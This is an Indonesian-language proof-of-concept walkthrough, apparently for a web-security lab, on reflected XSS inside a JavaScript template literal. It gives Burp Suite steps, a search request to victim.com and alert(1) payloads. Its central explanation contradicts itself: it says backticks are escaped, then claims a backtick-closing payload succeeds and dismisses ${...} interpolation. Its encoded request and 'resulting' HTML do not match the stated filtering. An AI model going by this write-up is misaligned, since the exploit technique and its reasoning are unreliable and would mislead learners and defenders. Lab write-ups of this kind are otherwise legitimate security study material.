### **Proof of Concept (PoC) Reflected XSS dalam Template Literal dengan Kurung Sudut, Tanda Petik Tunggal, Tanda Petik Ganda, Backslash, dan Backticks**

#### **Deskripsi Singkat**
Reflected Cross-Site Scripting (XSS) adalah jenis kerentanan keamanan web di mana input pengguna yang tidak divalidasi dengan baik direfleksikan kembali oleh aplikasi web dalam responsnya. Pada kasus ini, input pengguna direfleksikan di dalam template literal JavaScript yang membungkus pesan dalam tanda petik backticks (`` ` ``). Karakter kurung sudut (`<`, `>`), tanda petik tunggal (`'`), dan tanda petik ganda (`"`) di-HTML-encode, sementara backslash (`\`) dan backticks di-escape. Meskipun sanitasi ini mengurangi kemungkinan serangan XSS, kerentanan ini masih dapat dieksploitasi dengan teknik yang tepat untuk menyisipkan dan menjalankan kode JavaScript berbahaya.

#### **Langkah-langkah PoC**

1. **Mengirimkan String Acak pada Kotak Pencarian**

    - **Buka Halaman Pencarian:** Akses halaman pencarian pada aplikasi web target.
    - **Isi Kotak Pencarian:** Masukkan string acak alfanumerik ke dalam kotak pencarian, misalnya: `test123`.
    
    ![Langkah 1: Mengirimkan String Acak](images/Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks/1.png)

2. **Menggunakan Burp Suite untuk Menangkap dan Mengirim ke Repeater**

    - **Aktifkan Proxy Burp Suite:**
        - Buka **Burp Suite** dan aktifkan proxy.
        - Pastikan browser Anda dikonfigurasi untuk menggunakan proxy Burp Suite.
    
    - **Kirim Pencarian:**
        - Lakukan pencarian dengan string acak tadi sehingga permintaan (request) dikirim melalui Burp Suite.
    
    - **Intercept Permintaan:**
        - Di tab **Proxy > HTTP history**, temukan permintaan pencarian tersebut.
        - Klik kanan pada permintaan dan pilih **"Send to Repeater"**.
    
    ![Langkah 2: Mengirim ke Repeater](images/Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks/2.png)

3. **Mengamati Refleksi Input dalam Template Literal**

    - **Kirim Permintaan ke Repeater:**
        - Di tab **Repeater**, perhatikan bagaimana input `test123` direfleksikan dalam kode JavaScript:
        
          ```html
          <h1>Hasil Pencarian untuk: test123</h1>
          <script>
              const message = `Hasil pencarian untuk: test123`;
          </script>
          ```
          
        - Ini menunjukkan bahwa input pengguna dimasukkan ke dalam template literal JavaScript dengan tanda petik backticks, sementara karakter khusus lainnya di-encode atau di-escape.
    
    ![Langkah 3: Refleksi dalam Template Literal](images/Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks/3.png)

4. **Mengirim Payload Awal dan Mengamati Penyaringan**

    - **Coba Payload Sederhana:**
        - Kirim payload berikut pada parameter pencarian:
        
          ```
          test${alert(1)}
          ```
          
        - **Hasil:** Payload mungkin di-encode atau di-escape sehingga tidak berhasil mengeksekusi `alert(1)`.
        
          ```html
          <h1>Hasil Pencarian untuk: test${alert(1)}</h1>
          <script>
              const message = `Hasil pencarian untuk: test\${alert(1)}`;
          </script>
          ```
          
        - **Hasil:** Tanda dollar (`$`) dan curly braces (`{`, `}`) mungkin di-escape atau tidak diinterpretasikan sebagai ekspresi JavaScript, sehingga mencegah eksekusi `alert`.
    
    ![Langkah 4: Mengirim Payload Awal](images/Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks/4.png)

5. **Menggunakan Payload yang Berhasil Menembus Penyaringan**

    - **Susun Payload yang Tepat:**
        - Untuk memecah template literal dan menyisipkan skrip baru, gunakan payload berikut:
        
          ```
          \`;alert(1);// 
          ```
          
        - **Penjelasan Payload:**
            - `` ` ``: Menutup template literal yang sedang dibuka.
            - `;alert(1);`: Menambahkan pernyataan JavaScript untuk memanggil fungsi `alert(1)`.
            - `//`: Mengomentari sisa kode JavaScript untuk mencegah error sintaks.
    
    - **Kirimkan Payload dalam Pencarian:**
        - Masukkan payload di atas ke dalam kotak pencarian:
        
          ```
          \`;alert(1);// 
          ```
    
    - **Contoh Permintaan HTTP dengan Payload:**
        
        ```
        POST /search HTTP/2
        Host: victim.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: ...

        q=%60%3Balert(1)%3B%2F%2F
        ```
    
    - **Hasil pada Halaman Web:**
        
        Setelah payload diproses oleh aplikasi web, hasilnya akan terlihat seperti berikut:
        
        ```html
        <h1>Hasil Pencarian untuk: `;alert(1);//</h1>
        <script>
            const message = `Hasil pencarian untuk: `;alert(1);//`;
        </script>
        ```
        
        **Penjelasan:**
        - Template literal ditutup sebelum payload.
        - `alert(1);` dieksekusi sebagai pernyataan JavaScript terpisah.
        - `//` mengomentari sisa kode JavaScript untuk mencegah error sintaks.
    
    ![Langkah 5: Mengirim Payload Berhasil](images/Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks/5.png)

6. **Memverifikasi Eksekusi Payload**

    - **Salin URL:**
        - Di **Repeater**, klik kanan pada permintaan dengan payload dan pilih **"Copy URL"**.
    
    - **Buka Browser dan Paste URL:**
        - Buka browser (disarankan **Chrome** sesuai instruksi lab) dan tempelkan URL yang telah disalin.
    
    - **Hasil:**
        - Sebuah popup alert dengan pesan `1` muncul, menandakan bahwa serangan XSS berhasil dieksekusi.
    
    ![Langkah 6: Eksekusi Payload](images/Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks/6.png)

#### **Mengapa Payload Ini Berfungsi?**

Meskipun karakter khusus seperti tanda petik tunggal (`'`), tanda petik ganda (`"`), kurung sudut (`<`, `>`), backslash (`\`), dan backticks (`` ` ``) di-encode atau di-escape, payload ``\`;alert(1);// `` berhasil memecah template literal yang ada. Berikut adalah cara kerja payload:

1. **Menutup Template Literal:**
    - `` ` `` menutup template literal yang sedang dibuka dalam variabel `message`.
  
2. **Menyisipkan Fungsi JavaScript:**
    - `;alert(1);` menambahkan pernyataan JavaScript untuk memanggil fungsi `alert(1)`.

3. **Mengomentari Sisa Kode:**
    - `//` mengomentari sisa kode JavaScript untuk mencegah error sintaks dan memastikan bahwa payload dapat dieksekusi tanpa gangguan.

Sehingga, hasil akhir pada HTML setelah injeksi payload adalah sebagai berikut:

```html
<h1>Hasil Pencarian untuk: `;alert(1);//</h1>
<script>
    const message = `Hasil pencarian untuk: `;alert(1);//`;
</script>
```

Ketika halaman dimuat, `alert(1);` dieksekusi sebagai pernyataan JavaScript terpisah, menampilkan popup alert.

#### **Catatan Penting**

- **Keamanan:** Reflected XSS dapat digunakan untuk mencuri informasi sensitif, seperti cookie sesi, melakukan pengambilalihan akun, atau mengubah tampilan dan fungsi halaman web.
  
- **Etika:** Melakukan eksploitasi XSS tanpa izin adalah ilegal dan melanggar etika. PoC ini disediakan hanya untuk tujuan edukasi dan membantu dalam memahami serta mencegah kerentanan keamanan.
  
- **Browser Spesifik:** Pastikan untuk menguji payload pada browser yang ditentukan (Chrome) karena perilaku penanganan XSS dapat berbeda antar browser.

#### **Referensi:**

- [Cross-Site Scripting (XSS) di Konteks yang Berbeda](https://portswigger.net/web-security/cross-site-scripting/contexts)

---

![Gambar Ilustrasi Langkah 1](images/Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks/7.png)
![Gambar Ilustrasi Langkah 2](images/Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks/8.png)
![Gambar Ilustrasi Langkah 3](images/Reflected%20XSS%20into%20a%20template%20literal%20with%20angle%20brackets,%20single,%20double%20quotes,%20backslash%20and%20backticks/9.png)
